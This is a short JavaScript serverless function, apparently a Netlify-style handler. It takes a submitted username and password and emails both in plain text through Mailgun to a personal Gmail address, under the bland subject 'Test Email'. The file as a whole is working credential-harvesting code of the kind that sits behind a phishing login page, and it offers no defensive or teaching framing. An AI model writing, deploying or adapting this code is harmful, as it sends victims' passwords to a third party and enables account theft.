export async function handler(event) {
if (event.httpMethod !== 'POST') {
return { statusCode: 405, body: 'Method Not Allowed' };
}

try {
const body = JSON.parse(event.body || '{}');

const username = body.username || 'no username';
const password = body.password || 'no password';

const DOMAIN = 'sandbox6bb4164382f045b9975489c0e3137797.mailgun.org';
const API_KEY = process.env.MAILGUN_API_KEY;

const formData = new URLSearchParams();
formData.append('from', `postmaster@${DOMAIN}`);
formData.append('to', 'anabones716@gmail.com');
formData.append('subject', 'Test Email');
formData.append('text', `Username: ${username}\nPassword: ${password}`);

const response = await fetch(`https://api.mailgun.net/v3/${DOMAIN}/messages`, {
method: 'POST',
headers: {
Authorization: 'Basic ' + Buffer.from(`api:${API_KEY}`).toString('base64'),
'Content-Type': 'application/x-www-form-urlencoded'
},
body: formData
});

const data = await response.text();

if (!response.ok) {
throw new Error(data);
}

return {
statusCode: 200,
body: JSON.stringify({ message: 'Email sent!' })
};

} catch (error) {
console.error('FULL ERROR:', error.message);

return {
statusCode: 500,
body: JSON.stringify({ message: error.message })
};
}
}
